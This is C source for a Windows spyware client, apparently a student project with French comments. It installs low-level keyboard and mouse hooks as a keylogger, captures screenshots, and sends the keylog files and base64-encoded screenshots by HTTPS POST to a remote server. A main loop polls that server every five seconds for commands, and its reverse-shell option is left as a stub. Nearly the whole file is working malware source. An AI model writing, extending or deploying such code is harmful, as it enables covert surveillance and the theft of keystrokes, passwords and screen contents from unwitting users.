#include "pa5a.hpp"

EXTERN_C_START

DWORD ThreadKeylogger(VOID)
{
    //Hooks sur le clavier et la souris pour le keylogger
    if (!SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, NULL, 0) || !SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0))
        ExitThread(EXIT_FAILURE);

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ExitThread(0);
}
/********************************************************************************************************************************************************/
VOID SendKeylogs()
{
    HANDLE hFindData;
    WIN32_FIND_DATA findData;

    CHAR uuid[UUID_SIZE] = { 0 };
    GetUuid(uuid);

    if ((hFindData = FindFirstFile(DATA_FOLDER_W L"*.json", &findData)) == INVALID_HANDLE_VALUE)
        return;

    do
    {
        //Constructing path and filename
        WCHAR path[PATH_SIZE] = { 0 };

        if (StringCbPrintf(path, sizeof(path), L"%s%s", DATA_FOLDER_W, findData.cFileName) != S_OK)
            continue;

        wprintf(L"Sending file %ls ...\n", path);

        HANDLE hFile;
        if ((hFile = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
            continue;

        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(hFile, &fileSize))
        {
            CloseHandle(hFile);
            continue;
        }

        LPSTR fileContent = NULL;
        if ((fileContent = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (fileSize.LowPart + 1) * sizeof(CHAR))) == NULL)
        {
            CloseHandle(hFile);
            continue;
        }

        DWORD bytesRead = 0;
        if (!ReadFile(hFile, fileContent, fileSize.LowPart, &bytesRead, NULL))
        {
            CloseHandle(hFile);
            continue;
        }

        CHAR url[URL_SIZE] = { 0 };
        if (StringCbPrintfA(url, sizeof(url), "%s%s%s", CLIENT_API_A, uuid, KEYLOGS_API_A) != S_OK)
        {
            HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
            CloseHandle(hFile);
            continue;
        }

        SendJsonDataByHttps(SERVER_NAME_A, HTTPS_PORT, url, "POST", USER_AGENT_A, fileContent);

        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);

        CloseHandle(hFile);

    } while (FindNextFile(hFindData, &findData) != 0);

    FindClose(hFindData);
}
/********************************************************************************************************************************************************/
VOID SendScreenshot()
{
    CHAR uuid[UUID_SIZE] = { 0 };
    GetUuid(uuid);

    WCHAR path[PATH_SIZE] = { 0 };

    if (StringCbPrintf(path, sizeof(path), L"%s%s", DATA_FOLDER_W, L"screenshot.jpeg") != S_OK)
        return;

    wprintf(L"Taking screenshot in file %ls ...\n", path);

    if (SaveScreenshot(path) == FALSE)
        return;

    HANDLE hFile;
    if ((hFile = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        return;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize))
    {
        CloseHandle(hFile);
        return;
    }

    LPBYTE fileContent = NULL;
    if ((fileContent = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (fileSize.LowPart + 1) * sizeof(BYTE))) == NULL)
    {
        CloseHandle(hFile);
        return;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, fileContent, fileSize.LowPart, &bytesRead, NULL))
    {
        CloseHandle(hFile);
        return;
    }

    DWORD destinationSize;
    if (CryptBinaryToStringA((LPCBYTE)fileContent, fileSize.LowPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &destinationSize) == FALSE)
    {
        CloseHandle(hFile);
        return;
    }

    LPSTR base64string = NULL;
    if ((base64string = (LPSTR)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (destinationSize + 1000) * sizeof(CHAR)))) == NULL)
    {
        CloseHandle(hFile);
        return;
    }

    if (CryptBinaryToStringA((LPCBYTE)fileContent, fileSize.LowPart, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64string, &destinationSize) == FALSE)
    {
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        CloseHandle(hFile);
        return;
    }

    cJSON* object = NULL;
    LPSTR jsonString = NULL;

    if ((object = cJSON_CreateObject()) == NULL)
    {
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        CloseHandle(hFile);
        return;
    }

    if (cJSON_AddStringToObject(object, "screenshot", base64string) == NULL)
    {
        cJSON_Delete(object);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        CloseHandle(hFile);
        return;
    }

    if ((jsonString = cJSON_Print(object)) == NULL)
    {
        cJSON_Delete(object);
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
        CloseHandle(hFile);
        return;
    }

    CHAR url[URL_SIZE] = { 0 };
    if (StringCbPrintfA(url, sizeof(url), "%s%s%s", CLIENT_API_A, uuid, SCREENSHOT_API_A) != S_OK)
    {
        HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, fileContent);
        CloseHandle(hFile);
        return;
    }

    SendJsonDataByHttps(SERVER_NAME_A, HTTPS_PORT, url, "POST", USER_AGENT_A, jsonString);

    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, jsonString);

    cJSON_Delete(object);

    HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);

    DeleteFile(path);
}
/********************************************************************************************************************************************************/
INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow) 
{
    CreateConsole();

    //Thread de polling
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);

    CHAR uuid[UUID_SIZE] = { 0 };
    GetUuid(uuid);

    while (TRUE)
    {
        printf("Sending client informations\n");
        if (!SendClientInformations())
            continue;

        //Polling for new commands
        printf("Polling for new commands ...\n");
        Commands commands = GetCommands(SERVER_NAME_A, HTTPS_PORT);

        if (commands.keylogs)
        {
            printf("Sending keylogs ...\n");
            SendKeylogs();
        }
        if (commands.screenshot)
        {
            printf("Sending screenshot ...\n");
            SendScreenshot();
        }
        if (commands.reverseShell)
        {
            printf("Opening reverse shell ...\n");
            //Create Thread with Samuel's program
        }

        Sleep(5000);
    }

    return 0;
}
/********************************************************************************************************************************************************/

EXTERN_C_END